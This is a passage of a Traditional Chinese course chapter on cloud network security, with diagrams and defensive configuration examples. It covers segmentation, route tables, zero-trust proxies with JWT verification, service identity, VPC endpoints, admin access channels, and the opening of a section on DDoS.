DEEP({ 'sec-net': `
<p>上一課列了大規模系統網路安全的幾個重點：分段、零信任、邊緣防護、藏好源站。這一章把它們一個一個拆開：攻擊者踩進第一台機器之後，網路怎麼決定他能走多遠；「零信任」實際上由哪幾個零件組成；怎麼不經過網際網路就用到雲端服務、怎麼讓工程師連進私有機器；DDoS 的三種打法各打在哪一層、由誰吸收；速率限制要怎麼分層；WAF 能擋什麼、擋不了什麼；最後看資料是從哪些縫被送出去的。第 1.8 課（防火牆）和第 3.8 課（CDN）的深入圖解已經講過安全群組、出站過濾和源站保護的基本做法，這一章站在它們上面往前走。</p>

<h3><span class="badge lv1">基礎</span>一、爆炸半徑：分段到底在防什麼</h3>
<p>大型船隻的船身分成很多個水密艙。撞上冰山，破的是一兩個艙，水進不了其他艙，船就不會沉。網路分段（segmentation）是同一個道理：它不負責「不被打穿」，它負責「被打穿之後，損害停在那一格」。這個損害範圍叫<b>爆炸半徑</b>（blast radius）。</p>
<p>先分清楚兩種流量。<b>南北向</b>（north-south）是進出網際網路的流量，大家都很注意；<b>東西向</b>（east-west）是內部機器彼此之間的流量，常常沒人管。真實的入侵很少一開始就打中資料庫。第一個落腳點通常是價值不高的東西：一個沒更新的部落格、一台 CI 執行機器、一台測試伺服器。接著攻擊者在內部到處連，找下一台能進的機器，這叫<b>橫向移動</b>（lateral movement）。分段要切斷的，就是這條路。</p>
<figure class="figure"><svg viewBox="0 0 680 270" class="fg" style="width:100%;max-width:680px" role="img" aria-label="左邊扁平網路中，被攻陷的網站連得到應用、資料庫、快取、CI、管理後台全部五台；右邊分段後只連得到應用伺服器的 8080，要碰資料庫得先再攻下應用伺服器">
<text x="165" y="22" text-anchor="middle" class="fg-t warm">扁平網路：一台倒，全部曝光</text>
<text x="510" y="22" text-anchor="middle" class="fg-t acc">分段之後：只剩一條路</text>
<line x1="340" y1="34" x2="340" y2="262" class="fg-l dim dash"/>
<rect x="20" y="129" width="100" height="44" rx="6" class="fg-b warm"/><text x="70" y="148" text-anchor="middle" class="fg-t warm">網站</text><text x="70" y="165" text-anchor="middle" class="fg-t sm">已被攻陷</text>
<rect x="210" y="44" width="80" height="34" rx="6" class="fg-b"/><text x="250" y="66" text-anchor="middle" class="fg-t">應用</text>
<rect x="210" y="89" width="80" height="34" rx="6" class="fg-b"/><text x="250" y="111" text-anchor="middle" class="fg-t">資料庫</text>
<rect x="210" y="134" width="80" height="34" rx="6" class="fg-b"/><text x="250" y="156" text-anchor="middle" class="fg-t">快取</text>
<rect x="210" y="179" width="80" height="34" rx="6" class="fg-b"/><text x="250" y="201" text-anchor="middle" class="fg-t">CI</text>
<rect x="210" y="224" width="80" height="34" rx="6" class="fg-b"/><text x="250" y="246" text-anchor="middle" class="fg-t">管理後台</text>
<line x1="120" y1="151" x2="204.3" y2="66.7" class="fg-l warm"/><polygon points="210,61 207.5,69.8 201.2,63.5" class="fg-a warm"/>
<line x1="120" y1="151" x2="202.8" y2="109.6" class="fg-l warm"/><polygon points="210,106 204.9,113.6 200.8,105.6" class="fg-a warm"/>
<line x1="120" y1="151" x2="202" y2="151" class="fg-l warm"/><polygon points="210,151 202,146.5 202,155.5" class="fg-a warm"/>
<line x1="120" y1="151" x2="202.8" y2="192.4" class="fg-l warm"/><polygon points="210,196 200.8,196.4 204.9,188.4" class="fg-a warm"/>
<line x1="120" y1="151" x2="204.3" y2="235.3" class="fg-l warm"/><polygon points="210,241 201.2,238.5 207.5,232.2" class="fg-a warm"/>
<rect x="360" y="129" width="100" height="44" rx="6" class="fg-b warm"/><text x="410" y="148" text-anchor="middle" class="fg-t warm">網站</text><text x="410" y="165" text-anchor="middle" class="fg-t sm">已被攻陷</text>
<rect x="550" y="44" width="80" height="34" rx="6" class="fg-b"/><text x="590" y="66" text-anchor="middle" class="fg-t">應用</text>
<rect x="550" y="89" width="80" height="34" rx="6" class="fg-b hot"/><text x="590" y="111" text-anchor="middle" class="fg-t">資料庫</text>
<rect x="550" y="134" width="80" height="34" rx="6" class="fg-b"/><text x="590" y="156" text-anchor="middle" class="fg-t">快取</text>
<rect x="550" y="179" width="80" height="34" rx="6" class="fg-b"/><text x="590" y="201" text-anchor="middle" class="fg-t">CI</text>
<rect x="550" y="224" width="80" height="34" rx="6" class="fg-b"/><text x="590" y="246" text-anchor="middle" class="fg-t">管理後台</text>
<line x1="460" y1="151" x2="544.3" y2="66.7" class="fg-l on"/><polygon points="550,61 547.5,69.8 541.2,63.5" class="fg-a on"/>
<text x="486" y="92" text-anchor="middle" class="fg-t sm acc">只開 8080</text>
<line x1="460" y1="151" x2="550" y2="106" class="fg-l dim dash"/><text x="510" y="133" text-anchor="middle" class="fg-t warm">✕</text>
<line x1="460" y1="151" x2="550" y2="151" class="fg-l dim dash"/><text x="510" y="156" text-anchor="middle" class="fg-t warm">✕</text>
<line x1="460" y1="151" x2="550" y2="196" class="fg-l dim dash"/><text x="510" y="179" text-anchor="middle" class="fg-t warm">✕</text>
<line x1="460" y1="151" x2="550" y2="241" class="fg-l dim dash"/><text x="510" y="202" text-anchor="middle" class="fg-t warm">✕</text>
<path d="M630 61 H648 V106 H638" class="fg-l"/><polygon points="630,106 638,101.5 638,110.5" class="fg-a"/>
<text x="652" y="88" class="fg-t sm">5432</text>
</svg><figcaption>同樣是網站被攻陷。左邊攻擊者下一步可以直接碰資料庫；右邊他只碰得到應用伺服器的一個連接埠，要拿資料庫，得先再攻下一台。每多一關，就多一次被你發現的機會。</figcaption></figure>
<p>分段的單位由粗到細：<b>帳號</b>（正式和開發分開）、<b>VPC</b>（不同系統不互通）、<b>子網路</b>（依路由表分層）、<b>安全群組</b>（依角色互相指名）、最後是<b>工作負載的身分</b>（第三、四節）。越外層越硬、越便宜，越內層越細、越需要維護。成熟的設計是每一層都有，而不是只押在其中一層。</p>

<h3><span class="badge lv1">基礎</span>二、三層網路在雲端長什麼樣子：路由表是第一道牆</h3>
<p>大家講「公開子網路」「私有子網路」，好像子網路自己有屬性。其實沒有。一個子網路是公開還是私有，<b>完全由它的路由表決定</b>：</p>
<figure class="figure"><svg viewBox="0 0 680 330" class="fg" style="width:100%;max-width:680px" role="img" aria-label="一個 VPC 裡的三層子網路：公開子網路的路由表指向網際網路閘道，私有子網路指向 NAT 閘道，隔離子網路沒有預設路由；請求從網際網路經負載平衡器到應用伺服器再到資料庫">
<rect x="14" y="70" width="652" height="252" rx="10" class="fg-b dash"/>
<text x="24" y="88" class="fg-t sm">VPC 10.0.0.0/16</text>
<rect x="125" y="8" width="160" height="30" rx="6" class="fg-b"/><text x="205" y="28" text-anchor="middle" class="fg-t">網際網路</text>
<line x1="205" y1="38" x2="205" y2="48" class="fg-l"/><polygon points="205,56 200.5,48 209.5,48" class="fg-a"/>
<rect x="155" y="56" width="100" height="28" rx="6" class="fg-b alt"/><text x="205" y="75" text-anchor="middle" class="fg-t">IGW</text>
<text x="550" y="88" text-anchor="middle" class="fg-t sm acc">路由表</text>
<rect x="24" y="96" width="396" height="64" rx="8" class="fg-b alt"/>
<text x="36" y="114" class="fg-t sm">公開子網路 10.0.1.0/24</text>
<rect x="150" y="120" width="110" height="30" rx="5" class="fg-b"/><text x="205" y="140" text-anchor="middle" class="fg-t">負載平衡器</text>
<rect x="290" y="120" width="110" height="30" rx="5" class="fg-b"/><text x="345" y="140" text-anchor="middle" class="fg-t">NAT 閘道</text>
<rect x="24" y="176" width="396" height="64" rx="8" class="fg-b alt"/>
<text x="36" y="194" class="fg-t sm">私有子網路 10.0.2.0/24</text>
<rect x="150" y="200" width="110" height="30" rx="5" class="fg-b"/><text x="205" y="220" text-anchor="middle" class="fg-t">應用伺服器</text>
<rect x="24" y="256" width="396" height="58" rx="8" class="fg-b alt"/>
<text x="36" y="274" class="fg-t sm">隔離子網路 10.0.3.0/24</text>
<rect x="150" y="278" width="110" height="30" rx="5" class="fg-b hot"/><text x="205" y="298" text-anchor="middle" class="fg-t">資料庫</text>
<text x="272" y="298" class="fg-t sm warm">沒有路出去</text>
<line x1="205" y1="84" x2="205" y2="112" class="fg-l on"/><polygon points="205,120 200.5,112 209.5,112" class="fg-a on"/><text x="213" y="108" class="fg-t sm acc">443</text>
<line x1="205" y1="150" x2="205" y2="192" class="fg-l on"/><polygon points="205,200 200.5,192 209.5,192" class="fg-a on"/><text x="213" y="170" class="fg-t sm acc">8080</text>
<line x1="205" y1="230" x2="205" y2="270" class="fg-l on"/><polygon points="205,278 200.5,270 209.5,270" class="fg-a on"/><text x="213" y="250" class="fg-t sm acc">5432</text>
<path d="M260 215 H345 V158" class="fg-l alt"/><polygon points="345,150 340.5,158 349.5,158" class="fg-a alt"/><text x="353" y="190" class="fg-t sm alt">出站</text>
<path d="M345 120 V70 H263" class="fg-l alt"/><polygon points="255,70 263,65.5 263,74.5" class="fg-a alt"/>
<line x1="420" y1="128" x2="440" y2="128" class="fg-l dim dash"/><line x1="420" y1="208" x2="440" y2="208" class="fg-l dim dash"/><line x1="420" y1="285" x2="440" y2="285" class="fg-l dim dash"/>
<rect x="440" y="100" width="220" height="56" rx="6" class="fg-b"/><text x="452" y="122" class="fg-t sm mono">10.0.0.0/16 → local</text><text x="452" y="142" class="fg-t sm mono">0.0.0.0/0   → igw-…</text>
<rect x="440" y="180" width="220" height="56" rx="6" class="fg-b"/><text x="452" y="202" class="fg-t sm mono">10.0.0.0/16 → local</text><text x="452" y="222" class="fg-t sm mono">0.0.0.0/0   → nat-…</text>
<rect x="440" y="258" width="220" height="56" rx="6" class="fg-b"/><text x="452" y="280" class="fg-t sm mono">10.0.0.0/16 → local</text><text x="452" y="300" class="fg-t sm warm">沒有 0.0.0.0/0</text>
</svg><figcaption>綠線是使用者的請求一路往內；藍線是應用伺服器往外的連線，只能經過 NAT 出去，外面的人連不回來。資料庫那一層連往外的路都沒有。</figcaption></figure>
<ul>
<li><b>公開子網路</b>：預設路由（<code>0.0.0.0/0</code>）指向網際網路閘道（IGW）。這裡只放「本來就要面對網際網路」的東西：負載平衡器、NAT 閘道。</li>
<li><b>私有子網路</b>：預設路由指向 NAT 閘道。機器可以主動往外連（下載更新、呼叫第三方 API），但外面的人無法主動連進來，因為 NAT 只認得自己送出去那些連線的回應。</li>
<li><b>隔離子網路</b>：只有 VPC 內部的 <code>local</code> 路由。資料庫在這裡，就算被完全控制，也沒有一條路可以直接連上網際網路。</li>
</ul>
<p>路由表和安全群組是兩道不同的牆。安全群組說「誰可以連我的哪個埠」（第 1.8 課的深入圖解講過互相指名的寫法）；路由表說「封包根本有沒有路走」。安全群組寫錯一條，資料庫的 5432 也許就對外開了；但資料庫如果在隔離子網路裡，那一條錯誤規則也沒有路可以讓外面的人走進來。<b>兩道牆各自擋住對方的失誤</b>，這就是縱深防禦。</p>
<p>用這張圖追一次攻擊：攻擊者在應用伺服器上拿到了執行程式的能力。他連得到資料庫的 5432（這條規則本來就是為應用伺服器開的）；連不到資料庫的 SSH（安全群組沒開）；連不到 CI 和管理後台（不同的安全群組，甚至不同的 VPC）；但他<b>可以經由 NAT 往外連</b>，下載工具、把資料送走。最後這一點，第十節再處理。</p>

<h3><span class="badge lv2">進階</span>三、零信任：把「你在哪裡」換成「你是誰」</h3>
<p>零信任（zero trust）不是一個產品，是一個做法的轉向。它的起點常被追溯到 Google：2009 年 Google 遭到一次大規模入侵（外界稱為 Aurora 行動）之後，決定不再把「在公司網路裡」當成信任的理由，員工改成從任何網路直接存取內部系統，但每個請求都要驗身分、驗裝置。這套做法後來以 BeyondCorp 為名發表成一系列論文。美國國家標準與技術研究院（NIST）在 2020 年出版的 SP 800-207，把它整理成標準的架構和名詞。</p>
<p>在網頁應用的世界，最常見的實作是<b>身分感知代理</b>（identity-aware proxy，IAP）：</p>
<figure class="figure"><svg viewBox="0 0 680 280" class="fg" style="width:100%;max-width:680px" role="img" aria-label="身分感知代理：員工瀏覽器先到代理，代理向身分提供者完成單一登入與 MFA，再問政策引擎准不准，通過後帶著簽過的 JWT 把請求轉給內部後台；攻擊者直接連後台會被擋">
<rect x="10" y="112" width="110" height="46" rx="6" class="fg-b alt"/><text x="65" y="140" text-anchor="middle" class="fg-t">員工的瀏覽器</text>
<line x1="120" y1="135" x2="162" y2="135" class="fg-l"/><polygon points="170,135 162,130.5 162,139.5" class="fg-a"/>
<rect x="170" y="10" width="170" height="40" rx="6" class="fg-b alt"/><text x="255" y="35" text-anchor="middle" class="fg-t">身分提供者 IdP</text>
<line x1="255" y1="58" x2="255" y2="87" class="fg-l"/><polygon points="255,50 250.5,58 259.5,58" class="fg-a"/><polygon points="255,95 250.5,87 259.5,87" class="fg-a"/>
<text x="265" y="77" class="fg-t sm">SSO＋MFA</text>
<rect x="170" y="95" width="170" height="80" rx="8" class="fg-b hot"/><text x="255" y="128" text-anchor="middle" class="fg-t acc">身分感知代理</text><text x="255" y="150" text-anchor="middle" class="fg-t sm">政策執行點 PEP</text>
<line x1="255" y1="183" x2="255" y2="207" class="fg-l"/><polygon points="255,175 250.5,183 259.5,183" class="fg-a"/><polygon points="255,215 250.5,207 259.5,207" class="fg-a"/>
<text x="265" y="199" class="fg-t sm">准不准？</text>
<rect x="170" y="215" width="170" height="52" rx="6" class="fg-b"/><text x="255" y="237" text-anchor="middle" class="fg-t">政策引擎 PDP</text><text x="255" y="256" text-anchor="middle" class="fg-t sm">群組、裝置狀態、時間</text>
<line x1="340" y1="135" x2="462" y2="135" class="fg-l on"/><polygon points="470,135 462,130.5 462,139.5" class="fg-a on"/>
<text x="405" y="126" text-anchor="middle" class="fg-t sm acc">帶簽過的 JWT</text>
<rect x="470" y="95" width="200" height="80" rx="8" class="fg-b"/><text x="570" y="120" text-anchor="middle" class="fg-t">內部後台</text><text x="570" y="142" text-anchor="middle" class="fg-t sm">驗 JWT 的簽章、aud、exp</text><text x="570" y="160" text-anchor="middle" class="fg-t sm">只接受代理來的連線</text>
<rect x="470" y="215" width="200" height="44" rx="6" class="fg-b warm"/><text x="570" y="242" text-anchor="middle" class="fg-t warm">攻擊者直接連後台</text>
<line x1="570" y1="215" x2="570" y2="183" class="fg-l warm dash"/><polygon points="570,175 565.5,183 574.5,183" class="fg-a warm"/>
<text x="560" y="199" text-anchor="end" class="fg-t sm warm">✕ 網路擋、沒 JWT 也拒絕</text>
</svg><figcaption>代理負責「驗身分、問政策」，後台負責「確認請求真的經過代理」。少了後台這一半，代理就只是一扇旁邊開著窗的門。</figcaption></figure>
<ol>
<li>員工打開 <code>admin.example.com</code>，請求先到代理。沒有登入工作階段，就被導去身分提供者（IdP）完成單一登入和 MFA（第 5.3 課的 OIDC 流程）。</li>
<li>代理把身分、群組、裝置狀態（是不是公司管理的電腦、系統有沒有更新）、時間交給政策引擎，例如「ops 群組、公司管理的裝置，才能進管理後台」。</li>
<li>通過後，代理把請求轉給後台，並加上一個<b>代理自己簽過的 JWT</b>，裡面寫著使用者是誰。Cloudflare Access 放在 <code>Cf-Access-Jwt-Assertion</code> 標頭，Google 的 IAP 放在 <code>x-goog-iap-jwt-assertion</code>。</li>
<li>後台<b>自己驗證這個 JWT</b>：簽章對得上代理公布的公鑰、<code>aud</code> 是這個應用、還沒過期。</li>
</ol>
<p>第 4 步最常被省略，也最致命。如果後台只是讀一個普通標頭，例如 <code>X-Forwarded-Email</code>，那任何能直接連到後台的人，自己寫一個標頭就變成了管理員。驗證簽章的程式不長：</p>
<pre><code>import { createRemoteJWKSet, jwtVerify } from 'jose';

const TEAM = 'https://example.cloudflareaccess.com';
const JWKS = createRemoteJWKSet(new URL(TEAM + '/cdn-cgi/access/certs'));

export async function requireProxyIdentity(req, res, next) {
  const token = req.get('Cf-Access-Jwt-Assertion');
  if (!token) return res.status(401).end();
  try {
    const { payload } = await jwtVerify(token, JWKS, {
      issuer: TEAM,
      audience: process.env.ACCESS_AUD,   // 這個應用專屬的 aud
    });
    req.user = payload.email;
    next();
  } catch {
    res.status(401).end();
  }
}</code></pre>
<p>再加上網路那一層：後台只接受代理來的連線（或者乾脆不開任何對外的埠，由後台主動往外連到代理，也就是第 3.8 課提過的通道做法）。兩層都做，才算數。</p>

<h3><span class="badge lv2">進階</span>四、服務的身分：沒有密碼，怎麼證明「我是訂單服務」</h3>
<p>人有 SSO，服務呢？第 1.5 課的深入圖解講過 mTLS 的握手和 SPIFFE ID（例如 <code>spiffe://cluster.local/ns/shop/sa/orders</code>）。這裡補上兩個沒講到的問題。</p>
<p><b>第一個問題：服務怎麼拿到第一張憑證？</b>如果要先給它一把密碼才能去申請憑證，那把密碼要放哪裡？這叫「第零個秘密」（secret zero）問題。SPIFFE 的實作 SPIRE 用<b>工作負載證明</b>（workload attestation）來解：每個節點上有一個代理程式，Pod 透過本機的 Unix socket 來要憑證；代理程式向核心查出「這個連線來自哪個行程」，再向 kubelet 查「這個行程屬於哪個 Pod、哪個 Namespace、哪個服務帳號」，查到的屬性符合登記好的規則，才簽一張短命的憑證給它（預設大約一小時）。整個過程，工作負載不需要事先知道任何秘密，它的身分來自「它是誰在跑」，而不是「它知道什麼」。</p>
<p><b>第二個問題：知道是誰之後，誰准誰？</b>零信任在東西向的樣子，是「預設拒絕，依身分逐條允許」。以 Istio 為例，付款服務只准猜高低的 API 服務呼叫 <code>POST /v1/charge</code>：</p>
<pre><code>apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: payments-allow-api
  namespace: payments
spec:
  selector:
    matchLabels:
      app: payments
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/shop/sa/hilo-api"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/v1/charge"]</code></pre>
<p>這條規則跟 NetworkPolicy 不一樣的地方在於：它不看 IP，也不只看標籤，而是看密碼學證明過的身分，還能細到 HTTP 方法和路徑。NetworkPolicy 擋「誰連得到」，授權政策擋「連到之後能做什麼」，兩層搭配使用。</p>

<h3><span class="badge lv3">專業</span>五、私有連線：不經過網際網路，也能用雲端服務</h3>
<p>私有子網路裡的程式要讀 S3，預設的路是：經過 NAT 閘道、出到網際網路、再進 S3 的公開端點。這條路有三個問題：流量經過公開網路；NAT 閘道每處理 1 GB 都要收費，大量讀寫 S3 時這筆錢很驚人；而且你沒辦法說「這台機器只准連我們自己的儲存桶」。<b>VPC 端點</b>（VPC endpoint）把這條路換掉：</p>
<figure class="figure"><svg viewBox="0 0 680 250" class="fg" style="width:100%;max-width:680px" role="img" aria-label="私有子網路的應用伺服器連雲端服務的三條路：經 NAT 與網際網路閘道到 S3 公開端點，經閘道端點直接到 S3，經介面端點的私有 IP 到 SQS、KMS 等服務">
<rect x="10" y="100" width="120" height="50" rx="6" class="fg-b alt"/><text x="70" y="122" text-anchor="middle" class="fg-t">應用伺服器</text><text x="70" y="140" text-anchor="middle" class="fg-t sm">私有子網路</text>
<path d="M130 110 H160 V38 H192" class="fg-l warm"/><polygon points="200,38 192,33.5 192,42.5" class="fg-a warm"/>
<rect x="200" y="20" width="100" height="36" rx="6" class="fg-b warm"/><text x="250" y="43" text-anchor="middle" class="fg-t">NAT 閘道</text>
<line x1="300" y1="38" x2="332" y2="38" class="fg-l warm"/><polygon points="340,38 332,33.5 332,42.5" class="fg-a warm"/>
<rect x="340" y="20" width="80" height="36" rx="6" class="fg-b"/><text x="380" y="43" text-anchor="middle" class="fg-t">IGW</text>
<line x1="420" y1="38" x2="512" y2="38" class="fg-l warm"/><polygon points="520,38 512,33.5 512,42.5" class="fg-a warm"/>
<text x="466" y="30" text-anchor="middle" class="fg-t sm warm">經過網際網路</text>
<rect x="520" y="20" width="150" height="36" rx="6" class="fg-b"/><text x="595" y="43" text-anchor="middle" class="fg-t">S3 公開端點</text>
<text x="250" y="76" text-anchor="middle" class="fg-t sm warm">每 GB 收處理費</text>
<line x1="130" y1="125" x2="272" y2="125" class="fg-l on"/><polygon points="280,125 272,120.5 272,129.5" class="fg-a on"/>
<rect x="280" y="100" width="140" height="50" rx="6" class="fg-b hot"/><text x="350" y="122" text-anchor="middle" class="fg-t acc">閘道端點</text><text x="350" y="140" text-anchor="middle" class="fg-t sm">S3、DynamoDB 免費</text>
<line x1="420" y1="125" x2="512" y2="125" class="fg-l on"/><polygon points="520,125 512,120.5 512,129.5" class="fg-a on"/>
<text x="466" y="117" text-anchor="middle" class="fg-t sm acc">不出 VPC</text>
<rect x="520" y="100" width="150" height="50" rx="6" class="fg-b"/><text x="595" y="130" text-anchor="middle" class="fg-t">S3</text>
<path d="M130 140 H160 V205 H272" class="fg-l alt"/><polygon points="280,205 272,200.5 272,209.5" class="fg-a alt"/>
<rect x="280" y="180" width="140" height="50" rx="6" class="fg-b alt"/><text x="350" y="202" text-anchor="middle" class="fg-t alt">介面端點</text><text x="350" y="220" text-anchor="middle" class="fg-t sm">子網路裡的一張網卡</text>
<line x1="420" y1="205" x2="512" y2="205" class="fg-l alt"/><polygon points="520,205 512,200.5 512,209.5" class="fg-a alt"/>
<text x="466" y="197" text-anchor="middle" class="fg-t sm alt">私有 IP</text>
<rect x="520" y="180" width="150" height="50" rx="6" class="fg-b"/><text x="595" y="210" text-anchor="middle" class="fg-t">SQS、KMS、ECR…</text>
</svg><figcaption>同一個請求，三條路。閘道端點是路由表裡的一筆紀錄；介面端點是放進你子網路的一張網卡，DNS 把服務的名稱解析成它的私有 IP。</figcaption></figure>
<table>
<tr><th></th><th>閘道端點（gateway endpoint）</th><th>介面端點（interface endpoint，PrivateLink）</th></tr>
<tr><td>支援的服務</td><td>只有 S3 和 DynamoDB</td><td>大部分 AWS 服務，也包括別人用 PrivateLink 提供的服務</td></tr>
<tr><td>怎麼運作</td><td>在路由表加一筆，目的地是該服務的前綴清單（prefix list）</td><td>在子網路裡放一張網卡（ENI），私有 DNS 把服務名稱指到它</td></tr>
<tr><td>費用</td><td>免費</td><td>每個端點、每個可用區按小時計費，再加每 GB 費用</td></tr>
<tr><td>從機房或其他 VPC 用得到嗎</td><td>不行，只有這個 VPC 的路由表能用</td><td>可以，它就是一個私有 IP</td></tr>
</table>
<p>兩種端點都能掛一份<b>端點政策</b>（endpoint policy），限制「經過這個端點可以做什麼」；資源那一側也可以反過來要求「只接受經過某個端點來的請求」。這就是所謂的<b>資料邊界</b>（data perimeter）：</p>
<pre><code>{
  "Sid": "OnlyFromOurVpcEndpoint",
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:*",
  "Resource": ["arn:aws:s3:::hilo-saves", "arn:aws:s3:::hilo-saves/*"],
  "Condition": {
    "StringNotEquals": { "aws:SourceVpce": "vpce-0a1b2c3d4e5f67890" }
  }
}</code></pre>
<p>這樣一來，就算這台機器的角色憑證被偷，攻擊者在自己的電腦上拿著它也讀不到存檔，因為請求不是從那個端點來的。小心：這條 Deny 也會擋掉從主控台操作的管理員，實務上會再用 <code>aws:PrincipalArn</code> 排除一兩個緊急用的角色。</p>
<p><b>PrivateLink</b> 也能反過來用：把你自己的服務放在一個網路負載平衡器後面，建成「端點服務」，其他 VPC 或其他帳號就能用介面端點連過來。它跟 VPC 對等連線（peering）的差別是：對等連線讓兩個網路互相路由，CIDR 不能重疊，而且整個網段都通；PrivateLink 只露出一個服務、只能單向發起，CIDR 重疊也沒關係。給客戶或其他團隊用時，暴露面小得多。</p>

<h3><span class="badge lv3">專業</span>六、管理通道：跳板機、Session Manager、WireGuard</h3>
<p>工程師總有需要進私有機器的時候。三種常見做法，差別在「誰往誰連」和「誰來驗身分」：</p>
<figure class="figure"><svg viewBox="0 0 680 262" class="fg" style="width:100%;max-width:680px" role="img" aria-label="三種管理通道：跳板機要對外開 SSH 22 埠；Session Manager 由伺服器上的代理程式往外連，沒有任何對內的埠；WireGuard 或 Tailscale 由控制平面發金鑰，兩端直接建立加密通道">
<text x="10" y="22" class="fg-t warm">跳板機（bastion）</text>
<rect x="10" y="30" width="110" height="44" rx="6" class="fg-b alt"/><text x="65" y="57" text-anchor="middle" class="fg-t">工程師</text>
<line x1="120" y1="52" x2="242" y2="52" class="fg-l warm"/><polygon points="250,52 242,47.5 242,56.5" class="fg-a warm"/><text x="185" y="44" text-anchor="middle" class="fg-t sm warm">22 埠對外開</text>
<rect x="250" y="30" width="140" height="44" rx="6" class="fg-b warm"/><text x="320" y="49" text-anchor="middle" class="fg-t">跳板機</text><text x="320" y="66" text-anchor="middle" class="fg-t sm">要修補、要管金鑰</text>
<line x1="390" y1="52" x2="522" y2="52" class="fg-l"/><polygon points="530,52 522,47.5 522,56.5" class="fg-a"/><text x="460" y="44" text-anchor="middle" class="fg-t sm">SSH</text>
<rect x="530" y="30" width="140" height="44" rx="6" class="fg-b"/><text x="600" y="57" text-anchor="middle" class="fg-t">私有伺服器</text>
<text x="10" y="104" class="fg-t acc">Session Manager</text>
<rect x="10" y="112" width="110" height="44" rx="6" class="fg-b alt"/><text x="65" y="139" text-anchor="middle" class="fg-t">工程師</text>
<line x1="120" y1="134" x2="242" y2="134" class="fg-l on"/><polygon points="250,134 242,129.5 242,138.5" class="fg-a on"/><text x="185" y="126" text-anchor="middle" class="fg-t sm acc">HTTPS＋IAM</text>
<rect x="250" y="112" width="140" height="44" rx="6" class="fg-b hot"/><text x="320" y="131" text-anchor="middle" class="fg-t">Session Manager</text><text x="320" y="148" text-anchor="middle" class="fg-t sm">授權、全程記錄</text>
<line x1="530" y1="134" x2="398" y2="134" class="fg-l on"/><polygon points="390,134 398,129.5 398,138.5" class="fg-a on"/><text x="460" y="126" text-anchor="middle" class="fg-t sm acc">代理程式往外連</text>
<rect x="530" y="112" width="140" height="44" rx="6" class="fg-b"/><text x="600" y="131" text-anchor="middle" class="fg-t">私有伺服器</text><text x="600" y="148" text-anchor="middle" class="fg-t sm">沒有對內的埠</text>
<text x="10" y="196" class="fg-t alt">WireGuard／Tailscale</text>
<rect x="250" y="170" width="140" height="30" rx="6" class="fg-b alt"/><text x="320" y="190" text-anchor="middle" class="fg-t sm">控制平面：金鑰、ACL</text>
<line x1="250" y1="185" x2="120" y2="210" class="fg-l dim dash"/><line x1="390" y1="185" x2="530" y2="210" class="fg-l dim dash"/>
<rect x="10" y="206" width="110" height="44" rx="6" class="fg-b alt"/><text x="65" y="233" text-anchor="middle" class="fg-t">工程師</text>
<line x1="128" y1="236" x2="522" y2="236" class="fg-l alt"/><polygon points="120,236 128,231.5 128,240.5" class="fg-a alt"/><polygon points="530,236 522,231.5 522,240.5" class="fg-a alt"/>
<text x="325" y="228" text-anchor="middle" class="fg-t sm alt">點對點加密通道</text>
<rect x="530" y="206" width="140" height="44" rx="6" class="fg-b"/><text x="600" y="225" text-anchor="middle" class="fg-t">私有伺服器</text><text x="600" y="242" text-anchor="middle" class="fg-t sm">UDP 埠（WireGuard）</text>
</svg><figcaption>看箭頭方向：跳板機是外面往裡連，所以得開門；Session Manager 是伺服器往外連，門可以全關；WireGuard 開一個不回應陌生封包的 UDP 埠，身分靠金鑰。</figcaption></figure>
<table>
<tr><th></th><th>對內要開的埠</th><th>身分怎麼驗</th><th>紀錄</th></tr>
<tr><td>跳板機</td><td>SSH 22（至少限來源 IP）</td><td>SSH 金鑰，常常共用、難撤銷</td><td>要自己做</td></tr>
<tr><td>SSM Session Manager</td><td>無</td><td>IAM，可以要求 MFA；權限能細到「只能連有某個標籤的機器」</td><td>每個工作階段可存到 S3 或 CloudWatch</td></tr>
<tr><td>WireGuard</td><td>一個 UDP 埠（慣用 51820）</td><td>每台裝置一對金鑰，發放和撤銷要自己管</td><td>要自己做</td></tr>
<tr><td>Tailscale 這類網狀 VPN</td><td>通常不用開，靠 NAT 穿透，必要時走中繼</td><td>SSO 身分加裝置，ACL 寫在控制台</td><td>控制台有連線紀錄</td></tr>
</table>
<p>WireGuard 有個漂亮的設計：收到沒有通過驗證的封包，它<b>完全不回應</b>。掃描器看那個 UDP 埠，跟看一個關著的埠沒有兩樣。</p>
<p>Session Manager 還能做連接埠轉送，工程師不用跳板機就能從自己的電腦連到私有子網路裡的資料庫：</p>
<pre><code>aws ssm start-session --target i-0abc123def4567890 \\
  --document-name AWS-StartPortForwardingSessionToRemoteHost \\
  --parameters '{"host":["hilo-db.cluster-xxxx.ap-northeast-1.rds.amazonaws.com"],
                 "portNumber":["5432"],"localPortNumber":["15432"]}'
# 之後在本機連 localhost:15432</code></pre>
<p>不管選哪一種，原則一樣：沒有任何管理介面直接面對網際網路；連進來的人是具名的個人身分，而不是共用帳號；每一次連線都有紀錄；離職的人一個動作就能撤銷。</p>

<h3><span class="badge lv3">專業</span>七、DDoS 的三種打法，各由誰吸收</h3>
<p>第 3.8 課的深入圖解把 DDoS 分成網路層和應用層兩種洪水。實務上會再細分成三類，因為它們耗盡的資源不同，擋的位置也不同：</p>
<figure class="figure"><svg viewBox="0 0 680 260" class="fg" style="width:100%;max-width:680px" role="img" aria-label="三種 DDoS 在不同深度被擋下：流量型反射放大在 Anycast 骨幹被吸收，協定型 SYN flood 在邊緣的 SYN 代理被擋，應用層 HTTP 洪水在 WAF 與速率限制被擋，只有少量漏到源站">
<text x="215" y="28" text-anchor="middle" class="fg-t sm acc">Anycast 吸收</text>
<text x="345" y="28" text-anchor="middle" class="fg-t sm acc">SYN 代理</text>
<text x="475" y="28" text-anchor="middle" class="fg-t sm acc">WAF＋限流</text>
<text x="615" y="28" text-anchor="middle" class="fg-t sm">源站</text>
<rect x="160" y="38" width="110" height="212" rx="8" class="fg-b alt"/>
<rect x="290" y="38" width="110" height="212" rx="8" class="fg-b alt"/>
<rect x="420" y="38" width="110" height="212" rx="8" class="fg-b alt"/>
<rect x="560" y="38" width="110" height="212" rx="8" class="fg-b hot"/>
<rect x="10" y="58" width="130" height="44" rx="6" class="fg-b warm"/><text x="75" y="77" text-anchor="middle" class="fg-t">流量型</text><text x="75" y="94" text-anchor="middle" class="fg-t sm">UDP 反射放大</text>
